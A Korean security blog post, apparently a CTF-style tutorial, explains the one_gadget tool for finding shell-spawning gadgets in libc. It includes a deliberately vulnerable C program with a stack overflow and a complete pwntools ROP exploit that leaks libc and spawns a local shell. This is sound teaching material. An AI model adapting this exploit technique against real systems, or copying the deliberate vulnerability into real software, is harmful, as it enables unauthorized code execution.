@@ -1,0 +1,115 @@
+<!doctype html>
+<html lang="ko" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] One_Gadget · whrds.log</title><meta name="description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ libc 파일 내에서 execve(&#039;/bin/sh&#039;,0,0) 과 같은 셀을 실행주는 부분을 찾아주는 tool이다.다시 말해서 stack의 ret 위치에 one_gadget이 들어간다면 shell을 바로 얻을 수 있다는 것이다. 설치 방법gem ins">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/ko/posts/pwnable-one-gadget/">
+  <link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-one-gadget/"><link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-one-gadget/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] One_Gadget · whrds.log"><meta property="og:description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ libc 파일 내에서 execve(&#039;/bin/sh&#039;,0,0) 과 같은 셀을 실행주는 부분을 찾아주는 tool이다.다시 말해서 stack의 ret 위치에 one_gadget이 들어간다면 shell을 바로 얻을 수 있다는 것이다. 설치 방법gem ins"><meta property="og:url" content="https://whrds.github.io/ko/posts/pwnable-one-gadget/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] One_Gadget","description":"※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ libc 파일 내에서 execve('/bin/sh',0,0) 과 같은 셀을 실행주는 부분을 찾아주는 tool이다.다시 말해서 stack의 ret 위치에 one_gadget이 들어간다면 shell을 바로 얻을 수 있다는 것이다. 설치 방법gem ins","datePublished":"2024-06-24","inLanguage":"ko","url":"https://whrds.github.io/ko/posts/pwnable-one-gadget/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">본문으로 건너뛰기</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/ko/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="주 메뉴">
+      <a href="/ko/" aria-current="page">글</a>
+      <a href="/ko/about/">소개</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="#" class="active" lang="ko" aria-current="true">KO</a>
+        <a href="/en/posts/pwnable-one-gadget/" class="" lang="en">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] One_Gadget</h1><p class="article-description">※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ libc 파일 내에서 execve(&#039;/bin/sh&#039;,0,0) 과 같은 셀을 실행주는 부분을 찾아주는 tool이다.다시 말해서 stack의 ret 위치에 one_gadget이 들어간다면 shell을 바로 얻을 수 있다는 것이다. 설치 방법gem ins</p><div class="article-meta"><time datetime="2024-06-24">2024년 6월 24일</time><span>·</span><span>1 분 읽기</span></div></header><div class="prose"><p><strong>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. <strong>※</strong></strong> </p>
+<p>libc 파일 내에서 execve(‘/bin/sh’,0,0) 과 같은 셀을 실행주는 부분을 찾아주는 tool이다.</p>
+<p>다시 말해서 stack의 ret 위치에 one_gadget이 들어간다면 shell을 바로 얻을 수 있다는 것이다.</p>
+<h4>설치 방법</h4>
+<pre><code>gem install one_gadget
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-f16b9482209a/001.png" alt=""></p>
+<p>보통 ctf같은 곳에서는 libc파일을 제공해주지만 우리는 예제를 가지고 할 것이기 때문에 로컬 libc 파일을 가지고 해보겠다.</p>
+<p>사용 방법은 이미지와 같이 사용하면 된다.</p>
+<pre><code>one_gadget {libc}
+</code></pre>
+<p>총 4개의 one_gadget이 있다고 나와있다.</p>
+<p>다 똑같은 거 아니냐고 말할 수 있는데, 기능은 같은게 맞지만 사용할 수 있는 상황이 다르다.</p>
+<p>예를들어 가장 위에 있는 0x50a47를 사용하기 위해서는 rsp &amp; 0xf한 결과가 0이어야 되고, rcx와 rbp가 0x0을 가지고 있어야 한다.</p>
+<p>이렇게 one_gadget이 사기적인 방법 같지만 해당 조건들이 맞는 상황에서만 사용가능하다.</p>
+<p>아래 예제를 가지고 살펴보겠다.</p>
+<pre><code>//gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c
+#include &lt;stdio.h&gt;
+
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+}
+
+void gift(){
+	__asm__ (&quot;pop %rcx&quot;);
+	__asm__ (&quot;ret&quot;);
+}
+
+int vuln(){
+	char buf[100];
+	printf(&quot;Hello! whrd\n&quot;);
+	printf(&quot;stdout = %p\n&quot;,stdout);
+	read(0,buf,256);
+	printf(&quot;Good bye!\n&quot;);
+
+	return 0;
+}
+
+int main(){
+	initialize();
+	vuln();
+
+	return 0;
+}
+</code></pre>
+<p>컴파일한 ex파일에서 vuln()의 ret에 breakpoint를 걸어준다.</p>
+<p><img src="/assets/images/tistory/tistory-f16b9482209a/002.png" alt=""></p>
+<p>vuln()의 ret에서 멈췄을 때 상태이다. 여기서 사용가능한 one_gadget이 있는지 확인해보겠다.</p>
+<p>흠… 모든 one_gadget이 조건이 맞지 않아 사용할 수가 없다.</p>
+<p>이렇게 되면 조건을 임의로 맞춰주면 된다.</p>
+<p>코드를 보면 첫번째 one_gadget의 조건을 맞추기 위해 pop rcx라는 gadget을 만들어 두었다.</p>
+<p>이를 이용해서 구해보겠다.</p>
+<p>(stdout의 주소를 출력해주기 때문에 굳이 gadget을 만들지 않고도 libc의 gadget을 가져와 사용하면 된다.)</p>
+<p>one_gadget을 이용한 rop payload이다.</p>
+<pre><code>from pwn import *
+
+target = b'./ex'
+
+p = process(target)
+e = ELF(target)
+libc = ELF(b'/lib/x86_64-linux-gnu/libc.so.6')
+
+p.recvuntil(b'= ')
+leak = int(p.recvn(14),16)
+
+p_rcx = 0x00000000004011e5
+ret = 0x000000000040101a
+libc_base = leak - libc.sym['_IO_2_1_stdout_']
+one = [0x50a47, 0xebc81, 0xebc85, 0xebc88]
+
+print(hex(libc_base))
+
+payload = b'a'*0x70
+payload += p64(0x0)
+payload += p64(p_rcx)
+payload += p64(0x0)
+payload += p64(libc_base + one[0])
+
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<p>rbp와 rcx를 null로 맞추기 위한 과정이 들어가 있고, ret에는 one_gadget이 들어가 shell을 얻을 . 수있게 된다.</p>
+<p><img src="/assets/images/tistory/tistory-f16b9482209a/003.png" alt=""></p>
+</div><div class="article-end"><a href="/ko/">← 모든 글 보기</a><a href="/en/posts/pwnable-one-gadget/" hreflang="en">이 글을 영어로 읽기 →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>관찰하고, 검증하고, 기록합니다.</span><a href="/ko/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
